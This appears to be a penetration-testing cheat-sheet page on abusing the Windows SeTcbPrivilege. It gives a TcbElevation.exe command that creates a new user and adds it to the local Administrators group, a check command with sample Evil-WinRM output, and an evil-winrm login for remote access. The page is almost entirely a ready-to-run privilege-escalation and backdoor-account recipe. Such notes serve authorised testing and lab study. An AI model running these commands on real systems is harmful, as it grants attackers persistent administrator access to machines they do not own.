---
title: "SeTcbPrivilege"
tags: ["SeTcbPrivilege", "Windows", "Privilege Escalation"]
---

### Privesc #1: Create a New User in Administarors Group

{{< tab set1 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Create a New User

```console
.\TcbElevation.exe anything "C:\Windows\System32\cmd.exe /c net user <NEW_USER> <NEW_PASSWORD> /add && net localgroup administrators <NEW_USER> /add"
```

#### 2. Check

```console
net user <NEW_USER> /domain
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> net user fake_user /domain
User name                    fake_user                                                                                                                      
Full Name                                                                                                                                                   
Comment                                                                                                                                                     
User's comment                                                                                                                                              
Country/region code          000 (System Default)                                                                                                           
Account active               Yes                                                                                                                            
Account expires              Never                                                                                                                          

Password last set            8/14/2025 10:40:51 PM
Password expires             9/25/2025 10:40:51 PM
Password changeable          8/15/2025 10:40:51 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users
The command completed successfully.
```

#### 3. Remote Winrm

```console
evil-winrm -i <TARGET_DOMAIN> -u <NEW_USER> -p <NEW_PASSWORD>
```

<small>*Ref: [TcbElevation.exe](https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178)*</small>

{{< /tabcontent >}}
